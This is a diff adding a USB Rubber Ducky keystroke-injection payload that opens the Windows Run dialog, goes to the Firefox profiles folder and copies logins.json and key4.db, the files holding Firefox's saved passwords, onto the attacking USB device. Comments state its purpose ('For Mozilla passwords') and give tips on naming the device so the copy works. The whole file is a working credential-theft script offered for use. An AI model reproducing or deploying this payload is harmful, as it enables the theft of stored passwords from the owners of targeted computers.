@@ -1,0 +1,28 @@
+WINDOWS r
+REM For Mozilla passwords
+STIRNG %appdata%\Mozilla\Firefox\Profiles
+DOWN
+ENTER
+REM copy logins.json & key4.db
+CTRL F
+STRING logins.json
+DOWN
+DOWN
+MENU
+STRING n
+ENTER
+REM name rubber ducky something with a unique first character like "USB ___"
+STRING u
+REM this string only contains the first character of the device name
+CTRL F
+STRING key4.db
+DOWN
+DOWN
+MENU
+STRING n
+ENTER
+STRING u
+ALT F4
+REM Done.
+
+
